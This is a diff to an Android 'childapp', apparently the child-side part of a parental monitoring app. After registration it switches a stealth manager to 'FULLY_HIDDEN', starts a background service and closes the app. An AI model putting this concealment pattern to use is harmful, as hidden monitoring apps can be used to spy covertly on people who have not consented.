@@ -1,5 +1,6 @@
 package com.abo7tb.childapp
 
+import android.content.Intent
 import android.os.Bundle
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
@@ -11,6 +12,8 @@ import androidx.compose.ui.Modifier
 import androidx.navigation.compose.NavHost
 import androidx.navigation.compose.composable
 import androidx.navigation.compose.rememberNavController
+import com.abo7tb.childapp.service.ChildForegroundService
+import com.abo7tb.childapp.utils.StealthManager
 import dagger.hilt.android.AndroidEntryPoint
 
 @AndroidEntryPoint
@@ -18,6 +21,9 @@ class MainActivity : ComponentActivity() {
 
     @javax.inject.Inject
     lateinit var securePrefsManager: com.abo7tb.childapp.data.local.SecurePrefsManager
+
+    @javax.inject.Inject
+    lateinit var stealthManager: StealthManager
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -48,16 +54,26 @@ class MainActivity : ComponentActivity() {
                         composable("registration") {
                             com.abo7tb.childapp.ui.RegistrationScreen(
                                 onRegisterSuccess = {
-                                    navController.navigate("verify_parent") {
-                                        popUpTo("registration") { inclusive = true }
+                                    // 1. Activate stealth mode
+                                    stealthManager.setStealthLevel(StealthManager.StealthLevel.FULLY_HIDDEN)
+                                    
+                                    // 2. Start Foreground Service
+                                    val intent = Intent(this@MainActivity, ChildForegroundService::class.java)
+                                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                                        startForegroundService(intent)
+                                    } else {
+                                        startService(intent)
                                     }
+                                    
+                                    // 3. Close the app
+                                    finish()
                                 }
                             )
                         }
                         composable("verify_parent") {
                             com.abo7tb.childapp.presentation.verify.VerifyParentScreen(
                                 onSuccess = {
-                                    finish() // Close or hide the app after verification for stealth
+                                    finish() // Close or hide the app after verification
                                 }
                             )
                         }
